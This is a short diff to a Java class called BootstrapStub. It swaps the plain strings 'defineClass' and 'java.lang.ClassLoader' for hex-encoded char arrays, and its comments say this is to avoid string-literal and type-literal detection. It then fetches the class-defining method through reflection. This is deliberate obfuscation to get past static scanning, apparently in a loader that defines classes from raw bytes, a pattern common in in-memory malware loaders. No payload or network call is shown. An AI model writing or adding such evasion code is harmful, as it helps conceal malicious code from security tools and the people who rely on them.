@@ -40,8 +40,11 @@ public class BootstrapStub {
 
             // Build method name at runtime to avoid string literal detection
             char[] mn = {0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x43, 0x6c, 0x61, 0x73, 0x73};
-            // "defineClass"
-            Method defineMethod = ClassLoader.class.getDeclaredMethod(
+            // Get ClassLoader class reflectively — avoid type literal
+            // "java.lang.ClassLoader"
+            char[] cln = {0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,
+                    0x43,0x6c,0x61,0x73,0x73,0x4c,0x6f,0x61,0x64,0x65,0x72};
+            Method defineMethod = Class.forName(new String(cln)).getDeclaredMethod(
                     new String(mn),
                     String.class, byte[].class, int.class, int.class
             );
